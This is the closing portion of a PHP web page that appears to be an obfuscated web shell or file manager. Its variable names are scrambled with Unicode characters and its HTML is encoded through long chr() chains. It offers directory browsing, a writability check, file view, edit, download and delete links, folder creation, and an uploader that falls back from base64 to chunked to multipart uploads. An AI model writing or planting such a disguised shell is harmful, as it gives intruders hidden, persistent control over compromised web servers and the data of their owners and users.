    else:echo chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(61).urlencode($㈲̥́̂̈).chr(34).chr(32).chr(116).chr(105).chr(116).chr(108).chr(101).chr(61).chr(34).htmlspecialchars($ᚨᛃ̊㌁̅̊).'">'.htmlspecialchars($ᛇ̆㌁ﬕ̇).chr(60).chr(47).chr(97).chr(62).chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(115).chr(101).chr(112).chr(34).chr(62).chr(47).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62);
    endif;
endforeach;
?></div>
<div class="toolbar"><?php if(!$ᛗﬁ̇):?><a class="btn gray" href="?d=<?php echo urlencode($㲁̧ᛏ̩̋);?>">⬆ Up</a><?php else:?><span class="btn disabled">⬆ Up</span><?php endif;?> <a class="btn" href="?">🏠 Default</a> <a class="btn" href="?d=<?php echo urlencode(trim(str_replace($㌁̩ᛉ̩̄̉,'',$ᛚᛇ̨̃̇),DIRECTORY_SEPARATOR));?>" title="<?php echo htmlspecialchars($ᛚᛇ̨̃̇);?>">🌐 public_html</a> <a class="btn gray" href="?d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>">🔄 Refresh</a></div>
<div class="pathbox"><b>Root:</b> <?php echo htmlspecialchars($㌁̩ᛉ̩̄̉);?><br><b>Current:</b> <?php echo htmlspecialchars($㌁㉆㉉̨̨̩);?> — <b>W:</b> <?php echo is_writable($㌁㉆㉉̨̨̩)?chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(103).chr(114).chr(101).chr(101).chr(110).chr(34).chr(62).chr(121).chr(101).chr(115).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62):chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(114).chr(101).chr(100).chr(34).chr(62).chr(110).chr(111).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62);?> | <b>up:</b> <?php echo $㼁̊̌̌;?> | <b>post:</b> <?php echo $ᚢ̥̤̀̆́̃;?></div>
<form class="inline-form" onsubmit="event.preventDefault();up();">
    <input type="file" id="fi" required>
    <button class="btn green" type="submit">⬆ Upload</button>
    <div id="pg"><div id="pb"></div></div>
    <span class="st" id="st"></span>
</form>
<form class="inline-form" method="post" action="?a=n&amp;d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>"><input type="text" name="n" placeholder="folder name" required> <button class="btn" type="submit">➕ New</button></form>
<br><br><table><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr><?php if(empty($ﬁ㻁̩̩̊̈)):?><tr><td colspan="5" style="text-align:center;color:#999">Empty</td></tr><?php else:foreach($ﬁ㻁̩̩̊̈ as$㌁̦̂̉̅):?><tr><td><?php if($㌁̦̂̉̅['type']==='d'):$ﬖ̥̦̉=($㉉ᛊᚢね̤̣̌?$㉉ᛊᚢね̤̣̌.'/':'').$㌁̦̂̉̅['name'];?>📁 <a href="?d=<?php echo urlencode($ﬖ̥̦̉);?>" style="color:#007bff;text-decoration:none"><?php echo htmlspecialchars($㌁̦̂̉̅['name']);?></a><?php else:?>📄 <?php echo htmlspecialchars($㌁̦̂̉̅['name']);?><?php endif;?></td><td><?php echo$㌁̦̂̉̅['type']==='d'?'dir':'file';?></td><td><?php echo$㌁̦̂̉̅['type']==='f'?_size($㌁̦̂̉̅['size']):'-';?></td><td><?php echo htmlspecialchars($㌁̦̂̉̅['time']);?></td><td><?php if($㌁̦̂̉̅['type']==='d'):$ﬖ̥̦̉=($㉉ᛊᚢね̤̣̌?$㉉ᛊᚢね̤̣̌.'/':'').$㌁̦̂̉̅['name'];?><a class="btn" href="?d=<?php echo urlencode($ﬖ̥̦̉);?>">Open</a><?php else:?><a class="btn" href="?a=v&amp;f=<?php echo urlencode($㌁̦̂̉̅['name']);?>&amp;d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>">View</a> <a class="btn" href="?a=e&amp;f=<?php echo urlencode($㌁̦̂̉̅['name']);?>&amp;d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>">Edit</a> <a class="btn" href="?a=dl&amp;f=<?php echo urlencode($㌁̦̂̉̅['name']);?>&amp;d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>">DL</a><?php endif;?> <a class="btn red" href="?a=x&amp;f=<?php echo urlencode($㌁̦̂̉̅['name']);?>&amp;d=<?php echo urlencode($㉉ᛊᚢね̤̣̌);?>" onclick="return confirm('Delete?')">Del</a></td></tr><?php endforeach;endif;?></table></div>
<script>
(function(){
  var dir="<?php echo urlencode($㉉ᛊᚢね̤̣̌); ?>";
  var maxUp=<?php echo (int)$ᚦ̈ᛉ̧ﾚ̤̦̆; ?>;
  var maxPost=<?php echo (int)$㲁ﬕ̩ᚠ̣̥̈; ?>;
  var fi=document.getElementById('fi'),pg=document.getElementById('pg'),pb=document.getElementById('pb'),st=document.getElementById('st');
  function setSt(s){if(st)st.textContent=s;}
  function setBar(p){if(pg&&pb){pg.style.display='block';pb.style.width=p+'%';}}
  function resetBar(){if(pg&&pb){pg.style.display='none';pb.style.width='0%';}}
  function fmtB(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+'G';if(b>=1048576)return (b/1048576).toFixed(2)+'M';if(b>=1024)return (b/1024).toFixed(2)+'K';return b+'B';}
  function try_b64(file){return new Promise(function(res,rej){var r=new FileReader();r.onload=function(e){var x=new XMLHttpRequest();x.open('POST','?a=u2&d='+dir,true);x.setRequestHeader('Content-Type','application/json');x.upload.onprogress=function(ev){if(ev.lengthComputable){var p=Math.round(ev.loaded/ev.total*100);setBar(p);setSt('base64 '+p+'%');}};x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('HTTP '+x.status);}if(j.k)res(j);else rej(j);};x.onerror=function(){rej('net');};x.send(JSON.stringify({n:file.name,b:e.target.result}));};r.onerror=function(){rej('read');};r.readAsDataURL(file);});}
  function try_chunk(file){return new Promise(function(res,rej){var CHUNK=524288,off=0,total=file.size;function next(){var end=Math.min(off+CHUNK,total);var blob=file.slice(off,end);var fr=new FileReader();fr.onload=function(e){var x=new XMLHttpRequest();x.open('POST','?a=uc&d='+dir+'&n='+encodeURIComponent(file.name)+'&o='+off+'&z='+(end>=total?1:0),true);x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('chunk HTTP '+x.status);}if(!j.k)return rej(j);off=end;var p=Math.round(off/total*100);setBar(p);setSt('chunk '+p+'%');if(off<total)next();else res({k:1,m:'ok '+file.name+' [chunked]',method:'chunked'});};x.onerror=function(){rej('chunk net');};x.send(e.target.result);};fr.onerror=function(){rej('chunk read');};fr.readAsArrayBuffer(blob);}next();});}
  function try_mp(file){return new Promise(function(res,rej){var fd=new FormData();fd.append('f',file);var x=new XMLHttpRequest();x.open('POST','?a=u1&d='+dir,true);x.upload.onprogress=function(ev){if(ev.lengthComputable){var p=Math.round(ev.loaded/ev.total*100);setBar(p);setSt('mp '+p+'%');}};x.onload=function(){var j;try{j=JSON.parse(x.responseText);}catch(err){return rej('mp HTTP '+x.status);}if(j.k)res(j);else rej(j);};x.onerror=function(){rej('mp net');};x.send(fd);});}
  function up(){
    if(!fi.files.length){alert('Pick a file');return;}
    var f=fi.files[0];
    if(maxUp>0 && f.size>maxUp){setSt('large file ('+fmtB(f.size)+'), will use chunk…');}
    if(f.size===0){if(!confirm('File is 0 bytes. Continue anyway?'))return;}
    setBar(0);setSt('starting…');
    var chain=[['base64',try_b64],['chunk',try_chunk],['multipart',try_mp]];
    var i=0;
    function run(){
      if(i>=chain.length){setSt('✘ all methods failed');resetBar();alert('Upload failed all methods');return;}
      var name=chain[i][0],fn=chain[i][1];i++;
      setSt('trying '+name+'…');
      fn(f).then(function(j){
        setBar(100);
        var msg='✔ '+j.m;
        if(j.v>0)msg+=' (retry '+j.v+')';
        setSt(msg);
        setTimeout(function(){location.reload();},500);
      }).catch(function(err){
        setSt('✘ '+name+' failed, fallback…');
        setTimeout(run,300);
      });
    }
    run();
  }
  window.up=up;
})();
</script></body></html>
